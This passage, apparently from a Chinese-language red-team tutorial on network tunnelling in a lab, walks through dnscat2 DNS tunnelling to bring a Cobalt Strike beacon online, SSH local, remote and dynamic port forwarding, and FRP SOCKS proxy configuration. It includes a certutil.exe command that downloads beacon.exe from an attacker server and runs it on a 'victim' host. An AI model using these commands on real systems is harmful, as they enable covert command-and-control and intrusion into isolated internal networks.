alt="image-20230430182842692"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183326994.png" data-caption="image-20230430183326994"><img src="/../images/tunnel/image-20230430183326994.png" alt="image-20230430183326994"></a></p><h3 id="åˆ©ç”¨æ–¹å¼-1"><a href="#åˆ©ç”¨æ–¹å¼-1" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="dnscat2-ä¸Šçº¿-Cobastrike"><a href="#dnscat2-ä¸Šçº¿-Cobastrike" class="headerlink" title="dnscat2 ä¸Šçº¿ Cobastrike"></a>dnscat2 ä¸Šçº¿ Cobastrike</h4><p>1ã€cobastrike å¯åŠ¨ç›‘å¬</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183458656.png" data-caption="image-20230430183458656"><img src="/../images/tunnel/image-20230430183458656.png" alt="image-20230430183458656"></a></p><p>2ã€æœåŠ¡ç«¯ï¼ˆVPSï¼‰ï¼Œå¯åŠ¨æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby ./dnscat2.rb [NSä¸Šæœºè®°å½•.åŸŸå] -e open -c 000000 --no-cache</span><br><span class="line">sudo ruby ./dnscat2.rb log.xxx.xxx -e open -c 000000 --no-cache</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183801644.png" data-caption="image-20230430183801644"><img src="/../images/tunnel/image-20230430183801644.png" alt="image-20230430183801644"></a></p><p>3ã€å®¢æˆ·ç«¯ï¼ˆå—å®³è€…ï¼‰ï¼Œå¯åŠ¨æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-v0.07-client-win32.exe --secret=000000 log.xxx.xxx --delay 5000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183836873.png" data-caption="image-20230430183836873"><img src="/../images/tunnel/image-20230430183836873.png" alt="image-20230430183836873"></a></p><p>4ã€è¿œç¨‹ä¸‹è½½ beacon æ‰§è¡Œä¸Šçº¿</p><p>æœåŠ¡å™¨åˆ©ç”¨ python å¯ä¸´æ—¶webæœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 4444</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430160918692.png" data-caption="image-20230430160918692"><img src="/../images/tunnel/image-20230430160918692.png" alt="image-20230430160918692"></a></p><p>æœåŠ¡ç«¯è¿›å…¥ shell ï¼Œé€šè¿‡ certutil.exe è¿œç¨‹ä¸‹è½½ beacon ä¸Šçº¿ä¸»æœº</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://x.x.x.x:4444/beacon.exe C:\Users\Public\beacon.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430183925696.png" data-caption="image-20230430183925696"><img src="/../images/tunnel/image-20230430183925696.png" alt="image-20230430183925696"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430163507584.png" data-caption="image-20230430163507584"><img src="/../images/tunnel/image-20230430163507584.png" alt="image-20230430163507584"></a></p><p>æ‰§è¡Œ beacon.exe å®ç°ä¸Šçº¿</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public\beacon.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430163700295.png" data-caption="image-20230430163700295"><img src="/../images/tunnel/image-20230430163700295.png" alt="image-20230430163700295"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430184021047.png" data-caption="image-20230430184021047"><img src="/../images/tunnel/image-20230430184021047.png" alt="image-20230430184021047"></a></p><h2 id="å››ã€SSH-éš§é“"><a href="#å››ã€SSH-éš§é“" class="headerlink" title="å››ã€SSH éš§é“"></a>å››ã€SSH éš§é“</h2><p>SSH éš§é“ï¼ˆSSH Tunnelï¼‰æ˜¯é€šè¿‡ SSH åè®®å»ºç«‹çš„å®‰å…¨ç½‘ç»œé€šé“ï¼Œå¯ä»¥å°†æœ¬åœ°è®¡ç®—æœºå’Œè¿œç¨‹æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡æµé‡åŠ å¯†ä¼ è¾“ï¼Œç”¨äºä¼ è¾“ä¸å®‰å…¨çš„åè®®æˆ–è®¿é—®å—é™èµ„æºï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥ç”¨æ¥ç»•è¿‡é˜²ç«å¢™é™åˆ¶ï¼Œå¸®åŠ©ç”¨æˆ·ç»•è¿‡ç½‘ç»œè®¿é—®ã€‚</p><h3 id="éš§é“æ­å»º-2"><a href="#éš§é“æ­å»º-2" class="headerlink" title="éš§é“æ­å»º"></a>éš§é“æ­å»º</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| ä¸»æœº                           | ç¯å¢ƒ             |</span><br><span class="line">| ------------------------------ | ---------------- |</span><br><span class="line">| 192.168.11.137                 | æ”»å‡»æœº           |</span><br><span class="line">| 192.168.11.128ã€192.168.20.100 | å—å®³è€…ï¼ˆåŒç½‘å¡ï¼‰ |</span><br><span class="line">| 192.168.20.200                 | å†…ç½‘ä¸»æœº         |</span><br></pre></td></tr></table></figure></div><p>æ”»å‡»æœº 192.168.11.137 ï¼Œæ¨¡æ‹Ÿå…¬ç½‘ VPS</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426205042250.png" data-caption="image-20230426205042250"><img src="/../images/tunnel/image-20230426205042250.png" alt="image-20230426205042250"></a></p><p>å—å®³è€…ï¼ŒåŒç½‘å¡</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426210952158.png" data-caption="image-20230426210952158"><img src="/../images/tunnel/image-20230426210952158.png" alt="image-20230426210952158"></a></p><p>å†…ç½‘ä¸»æœº</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426211026202.png" data-caption="image-20230426211026202"><img src="/../images/tunnel/image-20230426211026202.png" alt="image-20230426211026202"></a></p><p>1ã€å‰æœŸç¯å¢ƒé…ç½®ï¼Œæ”»å‡»æœºä¸Šå¼€å¯sshè½¬å‘åŠŸèƒ½ï¼Œå°†GatewayPorts noæ”¹æˆyeså¹¶ä¸”æŠŠå‰é¢æ³¨é‡Šå»æ‰ï¼Œæ”¹ä¸ºå¦‚ä¸‹å›¾</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426211345157.png" data-caption="image-20230426211345157"><img src="/../images/tunnel/image-20230426211345157.png" alt="image-20230426211345157"></a></p><p>é‡å¯sshæœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426212238887.png" data-caption="image-20230426212238887"><img src="/../images/tunnel/image-20230426212238887.png" alt="image-20230426212238887"></a></p><h4 id="æœ¬åœ°ç«¯å£è½¬å‘"><a href="#æœ¬åœ°ç«¯å£è½¬å‘" class="headerlink" title="æœ¬åœ°ç«¯å£è½¬å‘"></a>æœ¬åœ°ç«¯å£è½¬å‘</h4><p>SSH æœ¬åœ°ç«¯å£è½¬å‘ï¼ˆLocal Port Forwardingï¼‰å°†æœ¬åœ°è®¡ç®—æœºä¸Šçš„ç«¯å£æ˜ å°„åˆ°è¿œç¨‹è®¡ç®—æœºä¸Šçš„æŠ€æœ¯ã€‚</p><p>1ã€è·³æ¿æœºï¼ˆåŒç½‘å¡ä¸»æœºï¼‰,ä¿®æ”¹ ssh é…ç½®æ–‡ä»¶ <code>vim /etc/ssh/sshd_config</code>ï¼Œé…ç½®å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AllowTcpForwarding yes # å…è®¸è½¬å‘TCPåè®®</span><br><span class="line">GatewayPorts yes # å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°è½¬å‘ç«¯å£</span><br><span class="line">PermitRootLogin yes # å…è®¸rootç™»å½•</span><br><span class="line">TCPKeepAlive yes # ä¿æŒå¿ƒè·³ï¼Œé˜²æ­¢sshæ–­å¼€</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426214010225.png" data-caption="image-20230426214010225"><img src="/../images/tunnel/image-20230426214010225.png" alt="image-20230426214010225"></a></p><p>ä¿®æ”¹å®Œæˆï¼Œé‡å¯ sshæœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426214048954.png" data-caption="image-20230426214048954"><img src="/../images/tunnel/image-20230426214048954.png" alt="image-20230426214048954"></a></p><p>2ã€æ”»å‡»æœºï¼ˆVPSï¼‰192.168.11.137 ä¸ å—å®³ä¸»æœº 192.168.11.128ï¼ˆweb æœåŠ¡ç«¯ï¼‰å»ºç«‹éš§é“ã€‚ä½¿ç”¨ ssh è¿æ¥åˆ° ip åœ°å€ä¸º 192.168.11.128 çš„ä¸»æœºï¼Œä½¿ç”¨ funsiooo ç”¨æˆ·èº«ä»½ç™»å½•ï¼Œå¹¶åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šåˆ›å»ºä¸€ä¸ª 8888 ç«¯å£è½¬å‘ï¼Œå°†æœ¬åœ°ç«¯å£ 8888 è¿æ¥åˆ°å†…ç½‘çš„ 192.168.20.200 çš„ 22 ç«¯å£ä¸Šï¼Œå®ç° ssh éš§é“è®¿é—®éš”ç¦»ç½‘æ®µçš„å†…ç½‘ä¸»æœº</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L [æœ¬æœºç«¯å£]:[éš§é“è®¿é—®çš„å†…ç½‘ä¸»æœº]:[éš§é“è®¿é—®çš„å†…ç½‘ä¸»æœºç«¯å£] [åŒç½‘å¡è·³æ¿æœºSSHè¿æ¥å‘½ä»¤]</span><br><span class="line">ssh -CfNg -L 8888:192.168.20.200:22 funsiooo@192.168.11.128</span><br></pre></td></tr></table></figure></div><blockquote><ul><li><code>-C</code>: å¯ç”¨å‹ç¼©åŠŸèƒ½ï¼Œå¯ä»¥å‡å°‘æ•°æ®ä¼ è¾“é‡ã€‚</li><li><code>-f</code>: åœ¨åå°è¿è¡ŒSSHå®¢æˆ·ç«¯ã€‚</li><li><code>-N</code>: ä¸æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œåªè¿›è¡Œç«¯å£è½¬å‘ã€‚</li><li><code>-g</code>: å…è®¸è¿œç¨‹ä¸»æœºé€šè¿‡è½¬å‘ç«¯å£è¿æ¥æœ¬åœ°è®¡ç®—æœºã€‚</li><li><code>-L</code>: æŒ‡å®šæœ¬åœ°ç«¯å£è½¬å‘è§„åˆ™ï¼Œæ ¼å¼ä¸º<code>æœ¬åœ°ç«¯å£:ç›®æ ‡åœ°å€:ç›®æ ‡ç«¯å£</code></li></ul></blockquote><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222124373.png" data-caption="image-20230426222124373"><img src="/../images/tunnel/image-20230426222124373.png" alt="image-20230426222124373"></a></p><p>æŸ¥çœ‹ç«¯å£ 8888 çš„å ç”¨æƒ…å†µï¼Œå¤„äºç›‘å¬çŠ¶æ€ï¼Œæ­£å¸¸å·¥ä½œçŠ¶æ€</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep 8888</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222449818.png" data-caption="image-20230426222449818"><img src="/../images/tunnel/image-20230426222449818.png" alt="image-20230426222449818"></a></p><p>3ã€é€šè¿‡æœ¬æœºè¿æ¥å†…ç½‘ 192.168.20.200 ä¸»æœºï¼Œå› ä¸º ssh éš§é“å·²æ­å»ºï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ ssh æœ¬æœºçš„ 8888 ç«¯å£æ—¶ï¼Œssh éš§é“ä¼šå°† 8888 ç«¯å£çš„æµé‡é€šè¿‡è·³æ¿æœº 192.168.11.128 ä¸­çš„ 192.168.20.100 ç½‘å¡è®¿é—® 192.168.20.200 çš„ 22 ç«¯å£ï¼Œå®ç°è·¨ç½‘æ®µè®¿é—®ï¼Œæ³¨æ„è¿™æ¬¡çš„ ssh å¯†é’¥ä¸º 192.168.20.200 ä¸»æœºçš„ ssh å¯†ç ï¼ˆå½“å†…ç½‘ä¸»æœºä¸º windows æ—¶ï¼Œ22 ç«¯å£å¯å˜ä¸º 3389ï¼Œåœ¨çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹å¯è·¨ç½‘æ®µè¿œç¨‹è¿æ¥windowsï¼‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 8888 root@127.0.0.1</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426222914800.png" data-caption="image-20230426222914800"><img src="/../images/tunnel/image-20230426222914800.png" alt="image-20230426222914800"></a></p><p>éš§é“æµé‡å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230426223551493.png" data-caption="image-20230426223551493"><img src="/../images/tunnel/image-20230426223551493.png" alt="image-20230426223551493"></a></p><h4 id="è¿œç¨‹ç«¯å£è½¬å‘"><a href="#è¿œç¨‹ç«¯å£è½¬å‘" class="headerlink" title="è¿œç¨‹ç«¯å£è½¬å‘"></a>è¿œç¨‹ç«¯å£è½¬å‘</h4><p>SSH è¿œç¨‹ç«¯å£è½¬å‘ï¼ˆRemote Port Forwardingï¼‰å°†è¿œç¨‹è®¡ç®—æœºä¸Šçš„ç«¯å£æ˜ å°„åˆ°æœ¬åœ°è®¡ç®—æœºä¸Šçš„ç«¯å£çš„æŠ€æœ¯ã€‚</p><p>1ã€è·³æ¿æœºï¼ˆåŒç½‘å¡ï¼‰ä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œåˆ©ç”¨ ssh å»ºç«‹éš§é“ï¼Œå°† 192.168.20.200 çš„ 22 ç«¯å£æµé‡è½¬å‘è‡³æ”»å‡»è€…ä¸»æœº 192.168.11.137 çš„ 2222 ç«¯å£ä¸Šï¼Œéš§é“å»ºç«‹åï¼Œå¯é€šè¿‡æ”»å‡»è€…ä¸»æœºçš„ 2222 ç«¯å£è®¿é—®éš”ç¦»ç½‘æ®µ 192.168.20.200 çš„ 22 ç«¯å£ï¼Œå®ç°è·¨ç½‘æ®µè®¿é—®ã€‚æ³¨æ„æ­¤å¤„çš„ ssh å¯†ç ä¸ºæ”»å‡»è€… 192.168.11.137 ä¸»æœºçš„ ssh å¯†ç ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [è¿œç¨‹ä¸»æœºç«¯å£]: [ç›®æ ‡ä¸»æœº]: [ç›®æ ‡ä¸»æœºç«¯å£] [æ”»å‡»è€…ä¸»æœº]</span><br><span class="line">ssh -R 2222:192.168.20.200:22  root@192.168.11.137</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427211839927.png" data-caption="image-20230427211839927"><img src="/../images/tunnel/image-20230427211839927.png" alt="image-20230427211839927"></a></p><p>æ”»å‡»è€…ä¸»æœº 2222 ç«¯å£æ­£åœ¨ç›‘å¬</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427211827875.png" data-caption="image-20230427211827875"><img src="/../images/tunnel/image-20230427211827875.png" alt="image-20230427211827875"></a></p><p>2ã€æ”»å‡»æœºä¸Šè®¿é—®å†…ç½‘ä¸»æœº</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2222 root@127.0.0.1</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212257242.png" data-caption="image-20230427212257242"><img src="/../images/tunnel/image-20230427212257242.png" alt="image-20230427212257242"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212206037.png" data-caption="image-20230427212206037"><img src="/../images/tunnel/image-20230427212206037.png" alt="image-20230427212206037"></a></p><p>éš§é“æµé‡å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427212655830.png" data-caption="image-20230427212655830"><img src="/../images/tunnel/image-20230427212655830.png" alt="image-20230427212655830"></a></p><h4 id="åŠ¨æ€è½¬å‘"><a href="#åŠ¨æ€è½¬å‘" class="headerlink" title="åŠ¨æ€è½¬å‘"></a>åŠ¨æ€è½¬å‘</h4><p>SSH åŠ¨æ€è½¬å‘ï¼ˆDynamic Port Forwardingï¼‰ï¼Œä¹Ÿç§°ä¸º SOCKS ä»£ç†ï¼Œåœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè®¾ç½®ä¸€ä¸ª SOCKS ä»£ç†ï¼Œé€šè¿‡ SSH éš§é“å°†ç½‘ç»œæµé‡è½¬å‘åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œå®ç°çªç ´è¾¹ç•Œï¼Œè®¿é—®å†…éƒ¨ç½‘ç»œèµ„æºï¼Œç±»ä¼¼ frp socks ä»£ç†ã€‚</p><p>1ã€æœåŠ¡ç«¯ï¼ˆVPSï¼‰ï¼Œssh å¼€å¯è½¬å‘åŠŸèƒ½ï¼Œå°† GatewayPorts no æ”¹æˆ yes å¹¶ä¸”æŠŠå‰é¢æ³¨é‡Šå»æ‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427202212608.png" data-caption="image-20230427202212608"><img src="/../images/tunnel/image-20230427202212608.png" alt="image-20230427202212608"></a></p><p>é‡å¯ ssh æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185530115.png" data-caption="image-20230430185530115"><img src="/../images/tunnel/image-20230430185530115.png" alt="image-20230430185530115"></a></p><p>2ã€å®¢æˆ·ç«¯ï¼ˆå—å®³è€…ï¼‰ï¼Œé€šè¿‡ ssh å¼€å¯æœ¬åœ°ä»£ç† 135 ç«¯å£ï¼ˆç«¯å£ä»»æ„ï¼‰ï¼Œç„¶åè¾“å…¥æœ¬åœ° ssh å¯†ç ï¼Œè¿›è¡Œç›‘å¬</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D 0.0.0.0:135 funsiooo@localhost</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185640688.png" data-caption="image-20230430185640688"><img src="/../images/tunnel/image-20230430185640688.png" alt="image-20230430185640688"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427203742086.png" data-caption="image-20230427203742086"><img src="/../images/tunnel/image-20230427203742086.png" alt="image-20230427203742086"></a></p><p>åˆ©ç”¨ ssh è¿œç¨‹è½¬å‘åˆ°å…¬ç½‘çš„æœåŠ¡ç«¯ï¼ˆVPSï¼‰çš„ 2222 ç«¯å£ï¼Œæ­¤æ—¶è¾“å…¥çš„å¯†ç æ˜¯æœåŠ¡ç«¯ï¼ˆVPSï¼‰çš„sshå¯†ç </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -R 0.0.0.0:2222:0.0.0.0:135 root@å…¬ç½‘vps</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430185843591.png" data-caption="image-20230430185843591"><img src="/../images/tunnel/image-20230430185843591.png" alt="image-20230430185843591"></a></p><p>æœåŠ¡ç«¯ï¼ˆVPSï¼‰2222ç«¯å£å·²æ­£åœ¨ç›‘å¬ä¸­</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230427203538104.png" data-caption="image-20230427203538104"><img src="/../images/tunnel/image-20230427203538104.png" alt="image-20230427203538104"></a></p><p>3ã€æœ¬æœºåˆ©ç”¨ Proxifier è¿æ¥ Socks</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430190039259.png" data-caption="image-20230430190039259"><img src="/../images/tunnel/image-20230430190039259.png" alt="image-20230430190039259"></a></p><p>æœ¬æœºä»£ç† socks5 åå¯ç›´æ¥è®¿é—®éš”ç¦»ç½‘æ®µ 192.168.20.200 çš„ web æœåŠ¡</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430171653727.png" data-caption="image-20230430171653727"><img src="/../images/tunnel/image-20230430171653727.png" alt="image-20230430171653727"></a></p><p>éš§é“æµé‡å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430190320771.png" data-caption="image-20230430190320771"><img src="/../images/tunnel/image-20230430190320771.png" alt="image-20230430190320771"></a></p><h2 id="äº”ã€Socks-éš§é“"><a href="#äº”ã€Socks-éš§é“" class="headerlink" title="äº”ã€Socks éš§é“"></a>äº”ã€Socks éš§é“</h2><p>SOCKSï¼ˆSocket Secureï¼‰æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯é€šè¿‡ä¸€ä¸ªä»£ç†æœåŠ¡å™¨è®¿é—®äº’è”ç½‘ã€‚ä¸ HTTP ä»£ç†ä¸åŒï¼ŒSOCKS ä»£ç†å¯ä»¥æ”¯æŒä»»ä½•ç±»å‹çš„ç½‘ç»œæµé‡ï¼ŒåŒ…æ‹¬ TCP å’Œ UDP æµé‡ã€‚SOCKS åè®®æœ‰å¤šä¸ªç‰ˆæœ¬ï¼Œå…¶ä¸­ SOCKS5 æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ï¼Œå®ƒæ”¯æŒåŠ å¯†è®¤è¯å’Œæ•°æ®åŠ å¯†ç­‰åŠŸèƒ½ã€‚å½“å®¢æˆ·ç«¯ä½¿ç”¨ SOCKS ä»£ç†æ—¶ï¼Œå®ƒä¼šå‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¿æ¥è¯·æ±‚ï¼Œè¯·æ±‚è¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ä»£ç†æœåŠ¡å™¨ä¼šå»ºç«‹ä¸ç›®æ ‡æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼Œå¹¶å°†æ•°æ®è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å¯ä»¥åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šè¿è¡Œï¼Œä¹Ÿå¯ä»¥åœ¨å¦ä¸€ä¸ªç½‘ç»œä¸­è¿è¡Œï¼Œä¾‹å¦‚å†…ç½‘ä¸­çš„è®¡ç®—æœºã€‚ä½¿ç”¨ SOCKS ä»£ç†å¯ä»¥ç»•è¿‡æŸäº›ç½‘ç»œé™åˆ¶ï¼Œä¹Ÿå¯ä»¥ä¿æŠ¤ç”¨æˆ·çš„éšç§ï¼Œå› ä¸ºä»£ç†æœåŠ¡å™¨å¯ä»¥éšè—å®¢æˆ·ç«¯çš„çœŸå® IP åœ°å€ã€‚</p><h3 id="éš§é“æ­å»º-3"><a href="#éš§é“æ­å»º-3" class="headerlink" title="éš§é“æ­å»º"></a>éš§é“æ­å»º</h3><p>Socks éš§é“æ­å»ºä½¿ç”¨ FRP + proxifier å®ç°ï¼Œfrpé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a> ,æ­å»ºè¿‡ç¨‹ä¸­ä½¿ç”¨åˆ°çš„ç«¯å£éœ€è¦åœ¨é˜²ç«å¢™å¼€æ”¾ï¼Œéœ€è¦æ³¨æ„ä¸åŒç³»ç»Ÿéœ€ä¸‹è½½ä¸åŒç‰ˆæœ¬ï¼Œå¦‚æ”»å‡»æœºï¼ˆæœåŠ¡ç«¯ï¼‰ä¸ºlinux åˆ™éœ€è¦ä¸‹è½½ linux ç‰ˆæœ¬ï¼Œå—å®³è€…ï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸º windwos åˆ™éœ€è¦ä¸‹è½½ windwos ç‰ˆæœ¬ï¼Œä»¥ä¸‹é…ç½®ç›´æ¥å¤åˆ¶åˆ° frps.iniã€frpc.ini æ–‡ä»¶è¿è¡Œå³å¯ï¼Œè¿è¡Œåä½¿ç”¨ socks5 ä»£ç†å·¥å…· proxifier å³å¯è¿›è¡Œæµé‡ä»£ç†ã€‚</p><p>1ã€é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼ˆæ ¹æ®è‡ªèº«éœ€æ±‚è¿›è¡Œä¿®æ”¹ï¼‰</p><p>æœåŠ¡ç«¯-frps.ini</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0        # ç»‘å®šçš„ipï¼Œä¸ºæœ¬æœº</span><br><span class="line">bind_port = 7000           # ç»‘å®šçš„ç«¯å£</span><br><span class="line">dashboard_addr = 0.0.0.0   # ç®¡ç†åœ°å€</span><br><span class="line">dashboard_port = 7500      # webç®¡ç†ç«¯å£</span><br><span class="line">dashboard_user = root      # webç®¡ç†çš„ç”¨æˆ·å</span><br><span class="line">dashboard_pwd  = root      # webç®¡ç†ç”¨æˆ·çš„å¯†ç </span><br><span class="line">token = 1q2w3e             # å®¢æˆ·ç«¯æœåŠ¡ç«¯è¿æ¥çš„å¯†ç ï¼Œå®¢æˆ·ç«¯ä¹Ÿéœ€è¦é…ç½®ç›¸åŒçš„token</span><br><span class="line">heartbeat_timeout = 90     # å¿ƒè·³è¶…æ—¶æ—¶é—´</span><br><span class="line">max_pool_count = 5         # æœ€å¤§åŒæ—¶è¿æ¥æ•°</span><br></pre></td></tr></table></figure></div><p>å®¢æˆ·ç«¯-é…ç½®frpc.ini</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = x.x.x.x# æœåŠ¡ç«¯IPï¼ˆæ ¹æ®è‡ªå·±å®é™… VPS IP å¡«å†™ï¼‰</span><br><span class="line">server_port = 7000# æœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£</span><br><span class="line">token = 1q2w3e# ä¸æœåŠ¡ç«¯çš„ token ä¸€è‡´æ‰èƒ½æˆåŠŸéªŒè¯</span><br><span class="line">pool_count = 5# 